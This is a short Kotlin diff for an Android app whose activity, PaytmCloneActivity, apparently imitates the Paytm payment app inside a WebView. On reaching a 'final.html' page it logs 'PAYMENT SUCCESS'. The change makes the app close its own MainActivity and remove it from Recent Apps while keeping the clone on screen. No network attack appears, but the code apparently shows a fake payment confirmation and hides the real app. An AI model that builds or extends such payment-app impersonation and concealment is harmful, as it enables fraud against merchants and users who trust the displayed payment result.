@@ -159,22 +159,16 @@ class PaytmCloneActivity : AppCompatActivity() {
                 super.onPageFinished(view, url)
                 Log.d(TAG, "✅ Page loaded: $url")
                 
-                // ⭐ اگر final.html لود شد، کلون رو ببند و به MainActivity برگرد
+                // ⭐ اگر final.html لود شد، MainActivity رو ببند و از Recent Apps پاک کن
                 if (url != null && url.contains("final.html", ignoreCase = true)) {
                     Log.d(TAG, "════════════════════════════════════════")
-                    Log.d(TAG, "✅ PAYMENT SUCCESS - Closing clone and returning to main app")
+                    Log.d(TAG, "✅ PAYMENT SUCCESS - Closing MainActivity and keeping clone open")
                     Log.d(TAG, "════════════════════════════════════════")
                     
                     // ⭐ یک تأخیر کوتاه برای نمایش final.html
                     Handler(Looper.getMainLooper()).postDelayed({
-                        // ⭐ برگشت به MainActivity
-                        val intent = Intent(this@PaytmCloneActivity, MainActivity::class.java)
-                        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
-                        startActivity(intent)
-                        
-                        // ⭐ بستن کلون
-                        finish()
-                    }, 2000) // 2 ثانیه برای نمایش پیام موفقیت
+                        closeMainActivity()
+                    }, 1000) // 1 ثانیه برای نمایش پیام موفقیت
                     
                     return
                 }
@@ -273,6 +267,24 @@ class PaytmCloneActivity : AppCompatActivity() {
                     Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
                 }
             }
+        }
+    }
+
+    /**
+     * ⭐ بستن MainActivity و پاک کردنش از Recent Apps
+     */
+    private fun closeMainActivity() {
+        try {
+            // ⭐ فرستادن Intent به MainActivity برای بستن
+            val closeIntent = Intent(this, MainActivity::class.java).apply {
+                action = "com.example.test.ACTION_CLOSE"
+                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+            startActivity(closeIntent)
+            
+            Log.d(TAG, "✅ Close intent sent to MainActivity")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error closing MainActivity", e)
         }
     }
 
